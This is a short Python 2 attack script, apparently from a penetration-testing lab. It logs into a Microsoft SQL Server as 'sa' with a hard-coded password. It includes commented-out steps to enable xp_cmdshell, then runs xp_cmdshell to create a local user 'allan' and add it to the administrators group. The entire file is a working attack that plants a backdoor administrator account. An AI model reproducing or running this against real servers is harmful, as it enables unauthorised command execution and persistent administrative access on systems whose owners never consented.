#!/usr/bin/python

import _mssql

try:
	mssql = _mssql.connect("10.11.1.xx", "sa", "adminpwd")

	print "[*] Successful login with username 'sa' and password: " 

	#note ms sql > 2005 must be enabled
	#print "[*] Enabling 'xp_cmdshell'"
	#mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;")
	#mssql.execute_query("RECONFIGURE;")

	print "[*] here comes Allan"
	mssql.execute_query("xp_cmdshell 'net user allan Password! /ADD && net localgroup administrators allan /ADD'")
	mssql.close()

	print "[*] Success!"

except:
	print "[!] invalid user/password!!" 
